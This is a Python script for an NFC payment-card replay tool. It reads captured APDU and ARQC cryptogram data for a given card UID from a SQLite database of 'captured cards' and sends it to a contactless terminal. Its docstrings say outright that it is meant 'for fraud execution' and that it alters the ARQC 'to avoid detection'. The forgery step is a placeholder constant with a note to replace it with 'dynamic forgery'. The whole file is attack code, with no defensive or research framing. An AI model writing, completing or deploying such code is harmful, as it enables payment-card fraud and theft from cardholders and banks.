import nfc
import sqlite3
import random

class CardReplayer:
	def __init__(self, db_file="captured_cards.db", device="usb"):
		self.device = device
		self.db_file = db_file

	def replay_card(self, uid):
		"""Replay a captured card's APDU & ARQC data"""
		data = self._retrieve_card_data(uid)
		if not data:
			print(f"No data found for UID: {uid}")
			return

		print(f"Replaying card {uid}...")
		with nfc.ContactlessFrontend(self.device) as clf:
			clf.connect(rdwr={"on-connect": lambda tag: self._execute_replay(tag, data)})

	def _execute_replay(self, tag, data):
		"""Sends captured APDUs and ARQC for fraud execution"""
		apdu_request = bytes.fromhex(data["apdu_request"])
		arqc = bytes.fromhex(data["arqc"])

		# Modify ARQC if needed
		modified_arqc = self._modify_arqc(arqc)
		modified_apdu = apdu_request + modified_arqc

		response = tag.exchange(modified_apdu)
		print(f"Replayed Transaction: {modified_apdu.hex()}, Response: {response.hex()}")

	def _modify_arqc(self, arqc):
		"""Modify ARQC to avoid detection"""
		return bytes.fromhex("CAFEBABEDEADBEEF")  # Replace with dynamic forgery

	def _retrieve_card_data(self, uid):
		"""Retrieve stored APDU & ARQC data for a specific UID"""
		conn = sqlite3.connect(self.db_file)
		cursor = conn.cursor()
		cursor.execute("SELECT apdu_request, arqc FROM captured_cards WHERE uid=?", (uid,))
		row = cursor.fetchone()
		conn.close()
		if row:
			return {"apdu_request": row[0], "arqc": row[1]}
		return None
